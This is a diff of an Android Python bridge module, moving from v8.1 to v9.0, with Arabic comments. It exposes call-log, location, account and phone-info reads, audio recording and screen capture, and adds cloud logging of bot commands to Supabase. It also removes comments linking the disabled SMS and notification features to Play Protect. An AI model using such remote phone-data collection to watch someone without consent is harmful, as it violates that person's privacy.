@@ -1,17 +1,14 @@
 """
-bridge.py - v8.1 (الجسر الشامل المُحسَّن)
+bridge.py - v9.0 (Cloud Integration)
 
 ⛔ محذوف: SMS، Notifications
 ✅ مضاف: CallLog، Location، Audio، Phone، Accounts، Sensors
 
-التحسينات الجوهرية:
-  ✅ v8.0: Context-generation tracking لمنع stale cache
-  ✅ v8.0: _get_helper مع force_new + error logging
-  ✅ v8.0: دوال فحص صلاحية قبل كل عملية
-  ✅ v8.0: دوال إحصائيات (call_log_stats, accounts_stats)
-  ✅ v8.0: diagnose() شاملة للتشخيص
-  ✅ v8.0: get_recording_path() للحصول على مسار التسجيل الحالي
-  ✅ v8.0: dial_number() كبديل بدون صلاحية CALL_PHONE
+التحسينات في v9.0:
+  ✅ v9.0: cloud_agent integration
+  ✅ v9.0: get_cloud_status() — حالة Supabase
+  ✅ v9.0: report_command() — تسجيل أمر في Cloud
+  ✅ v9.0: get_session_info() — معلومات الجلسة
 
   ✅ v8.1: reset_context() — مسح السياق كلياً
   ✅ v8.1: get_enhanced_status() — حالة تفصيلية
@@ -19,6 +16,12 @@ bridge.py - v8.1 (الجسر الشامل المُحسَّن)
   ✅ v8.1: clear_helpers_for() — مسح helper محدد
   ✅ v8.1: is_context_stale() — كشف السياق القديم
   ✅ v8.1: verify_permission_binding() — التحقق من ربط الصلاحيات
+
+  ✅ v8.0: Context-generation tracking
+  ✅ v8.0: _get_helper مع force_new + error logging
+  ✅ v8.0: دوال فحص صلاحية قبل كل عملية
+  ✅ v8.0: دوال إحصائيات
+  ✅ v8.0: diagnose() شاملة
 """
 
 import logging
@@ -103,10 +106,7 @@ def get_context_generation() -> int:
 # ✅ v8.1: إعادة تعيين السياق
 # ==========================================================
 def reset_context() -> None:
-    """
-    ✅ v8.1: يمسح السياق والـ cache كلياً.
-    مفيد عند إيقاف البوت قبل إعادة التشغيل.
-    """
+    """✅ v8.1: يمسح السياق والـ cache كلياً."""
     global _context, _activity, _service
     global _context_generation, _context_timestamp
 
@@ -120,9 +120,7 @@ def reset_context() -> None:
 
 
 def is_context_stale(max_age_sec: float = 3600.0) -> bool:
-    """
-    ✅ v8.1: هل السياق قديم؟ (لم يُحدَّث خلال max_age_sec)
-    """
+    """✅ v8.1: هل السياق قديم؟"""
     import time
     if _context is None:
         return True
@@ -149,7 +147,8 @@ def _get_helper(class_name: str, force_new: bool = False) -> Any:
         HelperClass = jclass(f"com.example.myfirstapp.{class_name}")
         helper = HelperClass(_context)
         _helper_cache[class_name] = helper
-        log.debug("Helper created: %s (gen=%d)", class_name, _context_generation)
+        log.debug("Helper created: %s (gen=%d)",
+                  class_name, _context_generation)
         return helper
     except Exception as e:
         log.error("Failed to create helper %s: %s", class_name, e)
@@ -165,9 +164,7 @@ def clear_helper_cache():
 
 
 def clear_helpers_for(class_name: str) -> bool:
-    """
-    ✅ v8.1: مسح helper محدد من الـ cache.
-    """
+    """✅ v8.1: مسح helper محدد من الـ cache."""
     global _helper_cache
     if class_name in _helper_cache:
         del _helper_cache[class_name]
@@ -182,9 +179,7 @@ def get_cached_helpers() -> List[str]:
 
 
 def get_helper_info() -> Dict[str, Any]:
-    """
-    ✅ v8.1: معلومات تفصيلية عن الـ cache.
-    """
+    """✅ v8.1: معلومات تفصيلية عن الـ cache."""
     return {
         "count": len(_helper_cache),
         "names": list(_helper_cache.keys()),
@@ -202,7 +197,7 @@ def _safe_json(data, fallback: str = "{}") -> str:
     if isinstance(data, str):
         return data
     try:
-        return json.dumps(data, ensure_ascii=False)
+        return json.dumps(data, ensure_ascii=False, default=str)
     except Exception:
         return fallback
 
@@ -259,7 +254,8 @@ def open_url(url: str) -> str:
 
 def open_whatsapp_chat(phone: str = "", text: str = "") -> str:
     try:
-        return _get_helper("AppLauncher").openWhatsappChat(phone or "", text or "")
+        return _get_helper("AppLauncher").openWhatsappChat(
+            phone or "", text or "")
     except Exception as e:
         return f"❌ خطأ: {e}"
 
@@ -303,7 +299,7 @@ def open_camera_app() -> str:
 
 
 # ==========================================================
-# ⛔ SMS — معطّلة (Play Protect)
+# ⛔ SMS — معطّلة
 # ==========================================================
 def get_sms(limit: int = 10, search: str = "") -> str:
     log.warning("get_sms: disabled (permission removed)")
@@ -315,7 +311,7 @@ def send_sms(phone: str, text: str) -> str:
 
 
 # ==========================================================
-# ⛔ الإشعارات — معطّلة (Play Protect)
+# ⛔ الإشعارات — معطّلة
 # ==========================================================
 def get_notifications(filter_pkg: str = "", limit: int = 30) -> str:
     log.warning("get_notifications: disabled")
@@ -392,7 +388,7 @@ def capture_screen() -> str:
 
 
 # ==========================================================
-# ✅ سجل المكالمات
+# سجل المكالمات
 # ==========================================================
 def get_call_log(limit: int = 50, type_filter: str = "all",
                  search: str = "") -> str:
@@ -432,7 +428,7 @@ def has_call_log_permission() -> bool:
 
 
 # ==========================================================
-# ✅ الموقع
+# الموقع
 # ==========================================================
 def get_location() -> str:
     try:
@@ -468,7 +464,7 @@ def has_location_permission() -> bool:
 
 
 # ==========================================================
-# ✅ الميكروفون
+# الميكروفون
 # ==========================================================
 def start_audio_recording(duration_sec: int = 10) -> str:
     try:
@@ -524,7 +520,7 @@ def has_audio_permission() -> bool:
 
 
 # ==========================================================
-# ✅ معلومات الهاتف
+# معلومات الهاتف
 # ==========================================================
 def get_phone_info() -> str:
     try:
@@ -561,7 +557,7 @@ def has_call_permission() -> bool:
 
 
 # ==========================================================
-# ✅ الحسابات
+# الحسابات
 # ==========================================================
 def get_accounts(filter_type: str = "") -> str:
     try:
@@ -598,7 +594,7 @@ def has_accounts_permission() -> bool:
 
 
 # ==========================================================
-# ✅ المستشعرات
+# المستشعرات
 # ==========================================================
 def list_sensors() -> str:
     try:
@@ -641,7 +637,7 @@ def read_gyroscope() -> str:
 
 
 # ==========================================================
-# ✅ الصلاحيات
+# الصلاحيات
 # ==========================================================
 def _get_permission_manager():
     if _context is None:
@@ -724,10 +720,7 @@ def get_permission_level() -> str:
 # ✅ v8.1: التحقق من ربط الصلاحيات
 # ==========================================================
 def verify_permission_binding() -> Dict[str, Any]:
-    """
-    ✅ v8.1: التحقق من أن كل الصلاحيات الأربعة قابلة للفحص.
-    يُستخدم للتشخيص.
-    """
+    """✅ v8.1: التحقق من ربط الصلاحيات."""
     result = {
         "context_ready": _context is not None,
         "permissions": {},
@@ -759,7 +752,7 @@ def verify_permission_binding_json() -> str:
 
 
 # ==========================================================
-# ✅ اختبار التخزين
+# اختبار التخزين
 # ==========================================================
 def test_storage_access() -> str:
     results = {}
@@ -823,7 +816,62 @@ def get_device_info_json() -> str:
 
 
 # ==========================================================
-# ✅ التشخيص الشامل
+# 🆕 v9.0: Cloud Integration
+# ==========================================================
+
+def get_cloud_status() -> str:
+    """🆕 v9.0: حالة cloud_agent."""
+    try:
+        import cloud_agent
+        return cloud_agent.get_status_json()
+    except Exception as e:
+        return _safe_json({"error": str(e), "available": False})
+
+
+def get_session_info() -> str:
+    """🆕 v9.0: معلومات bot_session من Cloud."""
+    try:
+        import cloud_agent
+        return _safe_json(cloud_agent.get_session_status())
+    except Exception as e:
+        return _safe_json({"status": "unavailable", "error": str(e)})
+
+
+def is_my_session_active() -> bool:
+    """🆕 v9.0: هل هذا الجهاز هو النشط؟"""
+    try:
+        import cloud_agent
+        return cloud_agent.is_my_session_active()
+    except Exception:
+        return False
+
+
+def report_command(
+    action: str,
+    params: Optional[Dict[str, Any]] = None,
+    success: bool = True,
+    result_data: Optional[Dict[str, Any]] = None,
+    error: Optional[str] = None,
+    duration_ms: int = 0,
+) -> bool:
+    """🆕 v9.0: تسجيل أمر في Cloud (audit)."""
+    try:
+        import cloud_agent
+        return cloud_agent.log_command(
+            action=action,
+            params=params,
+            success=success,
+            result_data=result_data,
+            error=error,
+            duration_ms=duration_ms,
+        )
+    except Exception as e:
+        log.warning("report_command failed: %s", e)
+        return False
+
+
+# ==========================================================
+# التشخيص الشامل
 # ==========================================================
 def diagnose() -> str:
     report = {
@@ -831,6 +879,7 @@ def diagnose() -> str:
         "permissions": {},
         "features": {},
         "helpers": {},
+        "cloud": {},
         "errors": [],
     }
 
@@ -853,30 +902,18 @@ def diagnose() -> str:
 
     # 3. الميزات
     features = {}
-    try:
-        features["all_files"] = has_all_files_access()
-    except Exception as e:
-        report["errors"].append(f"all_files: {e}")
-    try:
-        features["call_log"] = has_call_log_permission()
-    except Exception as e:
-        report["errors"].append(f"call_log: {e}")
-    try:
-        features["location"] = has_location_permission()
-    except Exception as e:
-        report["errors"].append(f"location: {e}")
-    try:
-        features["audio"] = has_audio_permission()
-    except Exception as e:
-        report["errors"].append(f"audio: {e}")
-    try:
-        features["accounts"] = has_accounts_permission()
-    except Exception as e:
-        report["errors"].append(f"accounts: {e}")
-    try:
-        features["call_phone"] = has_call_permission()
-    except Exception as e:
-        report["errors"].append(f"call_phone: {e}")
+    for fname, fcall in [
+        ("all_files", has_all_files_access),
+        ("call_log", has_call_log_permission),
+        ("location", has_location_permission),
+        ("audio", has_audio_permission),
+        ("accounts", has_accounts_permission),
+        ("call_phone", has_call_permission),
+    ]:
+        try:
+            features[fname] = fcall()
+        except Exception as e:
+            report["errors"].append(f"{fname}: {e}")
     report["features"] = features
 
     # 4. الـ helpers
@@ -889,6 +926,13 @@ def diagnose() -> str:
             report["helpers"][name] = "✅"
         except Exception as e:
             report["helpers"][name] = f"❌ {e}"
+
+    # 🆕 v9.0: Cloud status
+    try:
+        import cloud_agent
+        report["cloud"] = cloud_agent.get_status()
+    except Exception as e:
+        report["cloud"] = {"available": False, "error": str(e)}
 
     return json.dumps(report, ensure_ascii=False, indent=2)
 
@@ -926,9 +970,6 @@ def get_status_json() -> str:
         return "{}"
 
 
-# ==========================================================
-# ✅ v8.1: حالة موسّعة
-# ==========================================================
 def get_enhanced_status() -> Dict[str, Any]:
     """حالة تفصيلية للتشخيص."""
     return {
@@ -952,4 +993,4 @@ def get_enhanced_status_json() -> str:
 # ==========================================================
 # تسجيل أولي
 # ==========================================================
-log.info("bridge.py loaded - v8.1 (enhanced)")
+log.info("bridge.py loaded - v9.0 (cloud-integrated)")
